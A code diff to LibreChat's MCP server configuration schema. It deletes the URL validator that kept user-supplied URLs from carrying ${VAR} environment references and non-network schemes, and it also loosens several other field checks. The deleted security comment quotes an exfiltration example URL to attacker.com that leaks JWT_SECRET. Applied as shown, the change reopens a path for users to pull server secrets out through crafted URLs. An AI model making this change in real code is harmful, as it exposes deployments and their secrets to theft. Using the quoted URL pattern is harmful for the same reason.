@@ -18,10 +18,10 @@ const BaseOptionsSchema = z.object({
    */
   startup: z.boolean().optional(),
   iconPath: z.string().optional(),
-  timeout: z.number().int().nonnegative().optional(),
+  timeout: z.number().optional(),
   /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
-  sseReadTimeout: z.number().int().positive().optional(),
-  initTimeout: z.number().int().nonnegative().optional(),
+  sseReadTimeout: z.number().positive().optional(),
+  initTimeout: z.number().optional(),
   /** Controls visibility in chat dropdown menu (MCPSelect) */
   chatMenu: z.boolean().optional(),
   /**
@@ -104,7 +104,7 @@ const BaseOptionsSchema = z.object({
 });
 
 export const StdioOptionsSchema = BaseOptionsSchema.extend({
-  type: z.literal('stdio').default('stdio'),
+  type: z.literal('stdio').optional(),
   /**
    * The executable to run to start the server.
    */
@@ -134,17 +134,17 @@ export const StdioOptionsSchema = BaseOptionsSchema.extend({
       return processedEnv;
     }),
   /**
-   * How to handle stderr of the child process.
-   * Accepts: 'pipe' | 'ignore' | 'inherit' | file descriptor number.
-   * Defaults to "inherit".
+   * How to handle stderr of the child process. This matches the semantics of Node's `child_process.spawn`.
+   *
+   * @type {import('node:child_process').IOType | import('node:stream').Stream | number}
+   *
+   * The default is "inherit", meaning messages to stderr will be printed to the parent process's stderr.
    */
-  stderr: z
-    .union([z.enum(['pipe', 'ignore', 'inherit']), z.number().int().nonnegative()])
-    .optional(),
+  stderr: z.any().optional(),
 });
 
 export const WebSocketOptionsSchema = BaseOptionsSchema.extend({
-  type: z.literal('websocket').default('websocket'),
+  type: z.literal('websocket').optional(),
   url: z
     .string()
     .transform((val: string) => extractEnvVariable(val))
@@ -161,7 +161,7 @@ export const WebSocketOptionsSchema = BaseOptionsSchema.extend({
 });
 
 export const SSEOptionsSchema = BaseOptionsSchema.extend({
-  type: z.literal('sse').default('sse'),
+  type: z.literal('sse').optional(),
   headers: z.record(z.string(), z.string()).optional(),
   url: z
     .string()
@@ -223,23 +223,6 @@ const omitServerManagedFields = <T extends z.ZodObject<z.ZodRawShape>>(schema: T
     oauth_headers: true,
   });
 
-const envVarPattern = /\$\{[^}]+\}/;
-const isWsProtocol = (val: string): boolean => /^wss?:/i.test(val);
-const isHttpProtocol = (val: string): boolean => /^https?:/i.test(val);
-
-/**
- * Builds a URL schema for user input that rejects ${VAR} env variable patterns
- * and validates protocol constraints without resolving environment variables.
- */
-const userUrlSchema = (protocolCheck: (val: string) => boolean, message: string) =>
-  z
-    .string()
-    .refine((val) => !envVarPattern.test(val), {
-      message: 'Environment variable references are not allowed in URLs',
-    })
-    .pipe(z.string().url())
-    .refine(protocolCheck, { message });
-
 /**
  * MCP Server configuration that comes from UI/API input only.
  * Omits server-managed fields like startup, timeout, customUserVars, etc.
@@ -249,23 +232,11 @@ const userUrlSchema = (protocolCheck: (val: string) => boolean, message: string)
  * Stdio allows arbitrary command execution and should only be configured
  * by administrators via the YAML config file (librechat.yaml).
  * Only remote transports (SSE, HTTP, WebSocket) are allowed via the API.
- *
- * SECURITY: URL fields use userUrlSchema instead of the admin schemas'
- * extractEnvVariable transform to prevent env variable exfiltration
- * through user-controlled URLs (e.g. http://attacker.com/?k=${JWT_SECRET}).
- * Protocol checks use positive allowlists (http(s) / ws(s)) to block
- * file://, ftp://, javascript:, and other non-network schemes.
  */
 export const MCPServerUserInputSchema = z.union([
-  omitServerManagedFields(WebSocketOptionsSchema).extend({
-    url: userUrlSchema(isWsProtocol, 'WebSocket URL must use ws:// or wss://'),
-  }),
-  omitServerManagedFields(SSEOptionsSchema).extend({
-    url: userUrlSchema(isHttpProtocol, 'SSE URL must use http:// or https://'),
-  }),
-  omitServerManagedFields(StreamableHTTPOptionsSchema).extend({
-    url: userUrlSchema(isHttpProtocol, 'Streamable HTTP URL must use http:// or https://'),
-  }),
+  omitServerManagedFields(WebSocketOptionsSchema),
+  omitServerManagedFields(SSEOptionsSchema),
+  omitServerManagedFields(StreamableHTTPOptionsSchema),
 ]);
 
 export type MCPServerUserInput = z.infer<typeof MCPServerUserInputSchema>;
